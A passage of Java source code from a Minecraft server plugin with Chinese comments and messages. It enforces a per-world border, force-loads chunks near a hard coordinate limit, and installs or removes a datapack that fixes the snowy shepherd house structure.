        return getConfig().contains(CONFIG_WORLDS + "." + world.getName() + ".diameter");
    }

    private double getWorldBorderDiameter(World world) {
        return getConfig().getDouble(CONFIG_WORLDS + "." + world.getName() + ".diameter", -1);
    }

    // ---------- 边界监听器 ----------
    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onPlayerMove(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        Location to = event.getTo();
        if (to == null) return;

        World world = to.getWorld();
        if (world == null) return;

        double x = to.getX();
        double z = to.getZ();
        double absX = Math.abs(x);
        double absZ = Math.abs(z);

        if (isWorldBorderEnabled(world)) {
            double diameter = getWorldBorderDiameter(world);
            double radius = diameter / 2.0;

            if (absX > radius || absZ > radius) {
                Location corrected = to.clone();
                if (absX > radius) {
                    corrected.setX(x > 0 ? radius : -radius);
                }
                if (absZ > radius) {
                    corrected.setZ(z > 0 ? radius : -radius);
                }
                player.teleport(corrected);
                player.sendMessage("§c你已到达世界边界！");
                return;
            }
        }

        if (absX >= HARD_LIMIT || absZ >= HARD_LIMIT) {
            int chunkX = to.getBlockX() >> 4;
            int chunkZ = to.getBlockZ() >> 4;
            Chunk chunk = world.getChunkAt(chunkX, chunkZ);
            if (!chunk.isLoaded()) {
                chunk.load(true);
            }
            if (isPaperServer()) {
                world.getChunkAtAsync(chunkX, chunkZ, (c) -> c.setForceLoaded(true));
            }
            final Location target = to.clone();
            Scheduler.runTask(IllegalStack.this, () -> {
                if (player.isOnline() && player.getWorld().equals(target.getWorld())) {
                    player.teleport(target);
                }
            });
        }
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onPlayerTeleport(PlayerTeleportEvent event) {
        Player player = event.getPlayer();
        Location to = event.getTo();
        if (to == null) return;

        World world = to.getWorld();
        if (world == null) return;

        double x = to.getX();
        double z = to.getZ();
        double absX = Math.abs(x);
        double absZ = Math.abs(z);

        if (absX >= HARD_LIMIT || absZ >= HARD_LIMIT) {
            int chunkX = to.getBlockX() >> 4;
            int chunkZ = to.getBlockZ() >> 4;
            Chunk chunk = world.getChunkAt(chunkX, chunkZ);
            if (!chunk.isLoaded()) {
                chunk.load(true);
            }
            if (isPaperServer()) {
                world.getChunkAtAsync(chunkX, chunkZ, (c) -> c.setForceLoaded(true));
            }
        }
    }

    // ---------- 数据包部署方法 ----------
    public void setShepherdHouseFix(boolean enable) {
        File worldFolder = Bukkit.getWorlds().get(0).getWorldFolder();
        File datapacksFolder = new File(worldFolder, "datapacks");
        File fixDatapackFolder = new File(datapacksFolder, "fix-snowy-shepherd-house");

        if (enable) {
            if (!fixDatapackFolder.exists()) {
                fixDatapackFolder.mkdirs();
                createPackMeta(fixDatapackFolder);
                File structureFolder = new File(fixDatapackFolder, "data/buidling_entrance/structures");
                structureFolder.mkdirs();
                File nbtFile = new File(structureFolder, "snowy_shepherds_house_1.nbt");
                try (InputStream in = getResource("snowy_shepherds_house_1.nbt")) {
                    if (in == null) {
                        getLogger().warning("修复文件 snowy_shepherds_house_1.nbt 未找到！请确认该文件已放入插件资源目录。");
                        return;
                    }
                    Files.copy(in, nbtFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                    getLogger().info("雪地牧羊人小屋修复数据包已部署。请执行 /reload 或重启服务器生效。");
                } catch (IOException e) {
                    getLogger().log(Level.SEVERE, "无法复制修复文件", e);
                }
            } else {
                getLogger().info("修复数据包已存在，无需重复部署。");
            }
        } else {
            if (fixDatapackFolder.exists()) {
                deleteDirectory(fixDatapackFolder);
                getLogger().info("修复数据包已移除。请执行 /reload 或重启服务器生效。");
            }
        }
    }

    private void createPackMeta(File packFolder) {
        File mcmeta = new File(packFolder, "pack.mcmeta");
        String content = "{\n" +
                "  \"pack\": {\n" +
                "    \"pack_format\": 48,\n" +
                "    \"description\": \"Fix for snowy shepherd house\"\n" +
                "  }\n" +
                "}";
        try (FileWriter writer = new FileWriter(mcmeta)) {
            writer.write(content);
        } catch (IOException e) {
            getLogger().log(Level.SEVERE, "无法创建 pack.mcmeta", e);
        }
    }

    private void deleteDirectory(File dir) {
        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    deleteDirectory(file);
                } else {
                    file.delete();
                }
            }
        }
        dir.delete();
    }
        }
